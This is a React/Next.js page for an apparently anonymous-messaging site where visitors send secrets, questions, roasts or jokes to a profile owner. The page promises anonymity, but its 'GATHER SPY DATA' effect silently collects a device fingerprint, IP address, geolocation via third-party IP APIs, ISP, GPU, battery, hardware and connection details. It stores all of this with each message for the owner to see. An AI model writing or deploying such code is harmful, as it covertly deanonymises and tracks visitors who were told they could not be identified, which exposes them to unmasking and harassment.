"use client";

import React, { useState, useEffect, useCallback, useRef } from 'react';
import { supabase } from '@/lib/supabaseClient';
import { useParams } from 'next/navigation';
import { useFingerprint } from '@/app/utils/useFingerprint';
import { generateClientMasterId } from '@/app/utils/clientMasterId';
import { useToast } from '@/app/context/ToastContext';

// --- TYPES ---
interface SpyData {
  masterId: string;
  fingerPrint: string;
  ip: string;
  city: string;
  country: string;
  lat: string;
  lon: string;
  isp: string;
  gpu: string;
  cpu_cores: number;
  ram_gb: number | string;
  battery_level: string;
  is_charging: boolean;
  screen_res: string;
  window_res: string;
  pixel_ratio: number;
  os_platform: string;
  user_agent: string;
  browser_lang: string;
  timezone: string;
  connection_type: string;
  downlink_speed: string;
}

interface ExtendedNavigator extends Navigator {
  connection?: { effectiveType: string; downlink?: number };
  deviceMemory?: number;
  getBattery?: () => Promise<{ level: number; charging: boolean }>;
}

interface Message {
  id: number;
  created_at: string;
  content: string;
  author_name: string;
  reply: string;
}

interface OwnerProfile {
  username: string;
  avatar_url: string | null;
}

type InterfaceMode = 'secret' | 'question' | 'roast' | 'laugh';

const MODE_CONFIG = {
  secret:   { label: 'Secret',   title: 'Send me a secret.',      subtitle: "I won't know it's you.",     placeholder: 'Type your secret here...',    buttonText: 'Send Secret', icon: '🤫', limit: 1000 },
  question: { label: 'Question', title: 'Ask me anything.',        subtitle: "I'll answer honestly.",       placeholder: 'What do you want to know?',   buttonText: 'Ask Question', icon: '🤔', limit: 1000 },
  roast:    { label: 'Roast',    title: 'Roast me hard!',          subtitle: "Don't hold back. I can take it.", placeholder: 'You look like...',        buttonText: 'Roast Me',    icon: '🔥', limit: 1000 },
  laugh:    { label: 'Laugh',    title: 'Make me laugh!',          subtitle: 'Tell me a joke or something funny.', placeholder: 'Knock knock...',      buttonText: 'Send Joke',   icon: '😂', limit: 1000 },
};

export default function MessagePage() {
  const toast = useToast();
  const [newMessage, setNewMessage] = useState('');
  const [authorName, setAuthorName] = useState('');
  const [sending, setSending] = useState(false);
  const [activeMode, setActiveMode] = useState<InterfaceMode>('secret');
  const [ownerProfile, setOwnerProfile] = useState<OwnerProfile | null>(null);
  const [spyData, setSpyData] = useState<SpyData | null>(null);
  const { visitorId } = useFingerprint();
  const isSending = useRef(false); // Prevents double-submit
  const params = useParams();
  const linkId = params.linkId as string;

  // --- 0. FETCH OWNER PROFILE ---
  useEffect(() => {
    if (!linkId) return;
    const fetchOwnerProfile = async () => {
      try {
        const { data: linkData } = await supabase
          .from('links').select('creator_user_id').eq('id', linkId).single();
        if (!linkData) return;
        const { data: profileData } = await supabase
          .from('profiles').select('username, avatar_url').eq('id', linkData.creator_user_id).single();
        if (profileData) setOwnerProfile(profileData);
      } catch (err) {
        console.error('Profile fetch error:', err);
      }
    };
    fetchOwnerProfile();
  }, [linkId]);

  // --- 1. VIEW COUNT (session-scoped, no spam) ---
  useEffect(() => {
    if (!linkId || typeof window === 'undefined') return;
    const key = `viewed_${linkId}`;
    if (sessionStorage.getItem(key)) return;
    const countView = async () => {
      // Try RPC first, fallback to raw update
      const { error } = await supabase.rpc('increment_views', { link_uuid: linkId });
      if (!error) {
        sessionStorage.setItem(key, 'true');
      } else {
        // Fallback: just mark as viewed client-side
        sessionStorage.setItem(key, 'true');
        console.warn('View RPC not available:', error.message);
      }
    };
    countView();
  }, [linkId]);

  // --- 2. GATHER SPY DATA ---
  useEffect(() => {
    if (typeof window === 'undefined') return;

    const collectIntel = async () => {
      const nav = navigator as ExtendedNavigator;

      // A. GPU Detection
      const getGPU = (): string => {
        try {
          const canvas = document.createElement('canvas');
          const gl = (canvas.getContext('webgl') || canvas.getContext('experimental-webgl')) as WebGLRenderingContext | null;
          if (!gl) return 'Unknown GPU';
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'Generic GPU';
        } catch { return 'Blocked'; }
      };

      // B. IP + Geo — try multiple free APIs for reliability
      let ipInfo = { ip: 'Unknown', city: 'Unknown', country: 'Unknown', lat: '0', lon: '0', isp: 'Unknown' };
      
      // Try ipwho.is first (most reliable, no key required)
      try {
        const res = await fetch('https://ipwho.is/', { signal: AbortSignal.timeout(5000) });
        const json = await res.json();
        if (json.success) {
          ipInfo = {
            ip: json.ip,
            city: json.city || 'Unknown',
            country: json.country || 'Unknown',
            lat: String(json.latitude || 0),
            lon: String(json.longitude || 0),
            isp: json.connection?.isp || json.connection?.org || 'Unknown',
          };
        }
      } catch {
        // Fallback: ip-api.com
        try {
          const res2 = await fetch('https://ip-api.com/json/?fields=status,message,country,city,isp,lat,lon,query', {
            signal: AbortSignal.timeout(5000),
          });
          const json2 = await res2.json();
          if (json2.status === 'success') {
            ipInfo = {
              ip: json2.query,
              city: json2.city || 'Unknown',
              country: json2.country || 'Unknown',
              lat: String(json2.lat || 0),
              lon: String(json2.lon || 0),
              isp: json2.isp || 'Unknown',
            };
          }
        } catch {
          console.warn('All IP APIs failed — IP data unavailable.');
        }
      }

      // C. Battery
      let batt = { level: 'Unknown', charging: false };
      if (nav.getBattery) {
        try {
          const b = await nav.getBattery();
          batt = { level: `${Math.round(b.level * 100)}%`, charging: b.charging };
        } catch {}
      }

      // D. Connection speed
      const downlink = nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : 'Unknown';

      const rawData = {
        fingerPrint: visitorId || 'Loading...',
        ...ipInfo,
        gpu: getGPU(),
        cpu_cores: nav.hardwareConcurrency || 0,
        ram_gb: nav.deviceMemory ? `~${nav.deviceMemory} GB` : 'Unknown',
        battery_level: batt.level,
        is_charging: batt.charging,
        screen_res: `${window.screen.width}x${window.screen.height}`,
        window_res: `${window.innerWidth}x${window.innerHeight}`,
        pixel_ratio: window.devicePixelRatio || 1,
        os_platform: nav.platform || 'Unknown',
        user_agent: nav.userAgent,
        browser_lang: nav.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        connection_type: nav.connection?.effectiveType || 'Unknown',
        downlink_speed: downlink,
      };

      let mId = 'Generating...';
      try {
        mId = await generateClientMasterId(rawData);
      } catch { mId = 'Error'; }

      setSpyData({ ...rawData, masterId: mId });
    };

    collectIntel();
  }, [visitorId]);

  // --- 3. SEND MESSAGE ---
  const handlePostMessage = async () => {
    if (isSending.current) return; // Hard guard against double tap
    if (!newMessage.trim()) {
      toast.error('Please write something.');
      return;
    }

    isSending.current = true;
    setSending(true);

    const nameToUse = authorName.trim() || 'Anonymous';
    let finalContent = newMessage;
    if (activeMode === 'question') finalContent = `[QUESTION] ${newMessage}`;
    if (activeMode === 'roast') finalContent = `[ROAST] ${newMessage}`;
    if (activeMode === 'laugh') finalContent = `[LAUGH] ${newMessage}`;

    try {
      const { error } = await supabase.from('messages').insert({
        content: finalContent,
        author_name: nameToUse,
        link_id: linkId,
        reply: '',
        spy: spyData,
      });

      if (error) throw error;

      setNewMessage('');
      setAuthorName('');
      toast.success('Sent successfully! 🚀');

    } catch (err: any) {
      console.error('Send Error:', err);
      toast.error(`Failed to send: ${err.message || 'Check your connection'}`);
    } finally {
      setSending(false);
      isSending.current = false;
    }
  };

  // Handle enter key in textarea (Shift+Enter = newline, Enter alone = send)
  const handleKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
    if (e.key === 'Enter' && !e.shiftKey) {
      e.preventDefault();
      handlePostMessage();
    }
  };

  return (
    <div className="min-h-screen bg-[#050505] text-white font-sans selection:bg-purple-500 selection:text-white relative overflow-x-hidden">

      <style jsx>{`
        @keyframes blob { 0%,100% { transform: translate(0,0) scale(1); } 33% { transform: translate(30px,-50px) scale(1.1); } 66% { transform: translate(-20px,20px) scale(0.9); } }
        .animate-blob { animation: blob 7s infinite; }
        .animation-delay-2000 { animation-delay: 2s; }
      `}</style>

      {/* Background */}
      <div className="fixed inset-0 bg-gradient-to-br from-black via-purple-950/20 to-black z-0 pointer-events-none" />
      <div className="fixed inset-0 overflow-hidden pointer-events-none z-0">
        <div className="absolute top-0 left-1/4 w-64 sm:w-96 h-64 sm:h-96 bg-purple-600 rounded-full mix-blend-multiply filter blur-[128px] opacity-30 animate-blob" />
        <div className="absolute top-0 right-1/4 w-64 sm:w-96 h-64 sm:h-96 bg-pink-600 rounded-full mix-blend-multiply filter blur-[128px] opacity-30 animate-blob animation-delay-2000" />
      </div>
      <div className="fixed inset-0 bg-[url('https://grainy-gradients.vercel.app/noise.svg')] opacity-20 pointer-events-none z-0" />

      {/* Main Content */}
      <main className="relative z-10 w-full max-w-md mx-auto px-4 sm:px-6 py-8 sm:py-12 space-y-6 sm:space-y-8">

        {/* Profile Header */}
        <div className="flex flex-col items-center">
          <div className="relative w-20 h-20 sm:w-24 sm:h-24 mb-4">
            <div className="absolute inset-0 bg-gradient-to-tr from-pink-500 via-purple-500 to-indigo-500 rounded-full blur-md opacity-70 animate-pulse" />
            <div className="relative w-full h-full rounded-full p-[2px] bg-gradient-to-tr from-pink-500 via-purple-500 to-indigo-500">
              <div className="w-full h-full rounded-full bg-black overflow-hidden">
                <img
                  src={ownerProfile?.avatar_url || `https://api.dicebear.com/9.x/micah/svg?seed=${ownerProfile?.username || 'Twisted'}`}
                  alt="Profile"
                  className="w-full h-full object-cover"
                />
              </div>
            </div>
            <div className="absolute -bottom-1 -right-1 bg-black rounded-full p-1.5 border border-white/10 text-lg sm:text-xl shadow-lg">
              {MODE_CONFIG[activeMode].icon}
            </div>
          </div>
          <h1 className="text-xl sm:text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-white to-gray-400">
            @{ownerProfile?.username || '...'}
          </h1>
          <p className="text-gray-400 text-xs mt-1 text-center">
            {MODE_CONFIG[activeMode].subtitle}
          </p>
        </div>

        {/* Mode Switcher */}
        <div className="bg-white/5 border border-white/10 rounded-2xl p-1 flex backdrop-blur-md overflow-hidden">
          {(['secret', 'question', 'roast', 'laugh'] as InterfaceMode[]).map((mode) => (
            <button
              key={mode}
              onClick={() => setActiveMode(mode)}
              className={`flex-1 py-2 text-[10px] sm:text-xs font-bold rounded-xl transition-all duration-200 ${
                activeMode === mode
                  ? 'text-white bg-white/10 border border-white/10 shadow-sm'
                  : 'text-gray-500 hover:text-white/70'
              }`}
            >
              {MODE_CONFIG[mode].label}
            </button>
          ))}
        </div>

        {/* Input Card */}
        <div className="backdrop-blur-2xl bg-white/5 border border-white/10 rounded-3xl p-1 shadow-2xl">
          <div className="bg-black/20 rounded-[20px] p-4 sm:p-5 space-y-4">
            <div className="flex justify-between items-center text-[10px] font-mono text-gray-500 uppercase">
              <span className="flex items-center gap-1.5">
                <span className="w-1.5 h-1.5 rounded-full bg-red-500 animate-pulse" />
                Recording...
              </span>
              <span className="text-purple-400/80">ENCRYPTED</span>
            </div>

            <div className="space-y-1">
              <label className="text-xs text-gray-400 font-semibold ml-1">
                {MODE_CONFIG[activeMode].title}
              </label>
              <input
                type="text"
                value={authorName}
                onChange={(e) => setAuthorName(e.target.value)}
                placeholder="Nickname (optional) — e.g. Ghost, Bestie..."
                maxLength={30}
                className="w-full bg-white/5 border border-white/10 rounded-xl px-3 py-2 text-sm text-white focus:outline-none focus:border-purple-500/50 transition-all placeholder-gray-600"
              />
              <p className="text-[10px] text-gray-600 ml-1">Leave blank to stay fully anonymous</p>
            </div>

            <textarea
              value={newMessage}
              onChange={(e) => setNewMessage(e.target.value)}
              onKeyDown={handleKeyDown}
              placeholder={MODE_CONFIG[activeMode].placeholder}
              className="w-full bg-transparent text-base sm:text-lg text-white placeholder-gray-500/50 outline-none resize-none min-h-[120px] sm:min-h-[140px]"
              maxLength={MODE_CONFIG[activeMode].limit}
            />

            <div className="flex justify-end">
              <span className="text-[10px] text-gray-700 font-mono">
                {newMessage.length}/{MODE_CONFIG[activeMode].limit}
              </span>
            </div>
          </div>
        </div>

        {/* Submit Button */}
        <button
          onClick={handlePostMessage}
          disabled={sending}
          className="w-full group relative disabled:opacity-70 disabled:cursor-not-allowed"
        >
          <div className="absolute -inset-0.5 bg-gradient-to-r from-pink-600 to-purple-600 rounded-2xl blur opacity-60 group-hover:opacity-100 group-disabled:opacity-30 transition duration-200" />
          <div className="relative w-full bg-black rounded-2xl px-6 py-4 flex items-center justify-center gap-3 border border-white/10 group-hover:bg-black/80 active:scale-[0.98] transition-all">
            {sending ? (
              <>
                <div className="w-4 h-4 border-2 border-white/30 border-t-white rounded-full animate-spin shrink-0" />
                <span className="text-white font-bold">Sending...</span>
              </>
            ) : (
              <span className="text-base sm:text-lg font-bold text-white">
                {MODE_CONFIG[activeMode].buttonText}
              </span>
            )}
          </div>
        </button>

        {/* Footer */}
        <div className="text-center pb-6 flex flex-col items-center gap-2">
          <p className="text-[10px] text-gray-700">🔒 100% Anonymous • Sender IP Logged</p>
          <p className="text-xs font-bold text-transparent bg-clip-text bg-gradient-to-r from-purple-500 to-pink-500 opacity-60 tracking-widest uppercase">
            twst.fun
          </p>
        </div>
      </main>
    </div>
  );
}
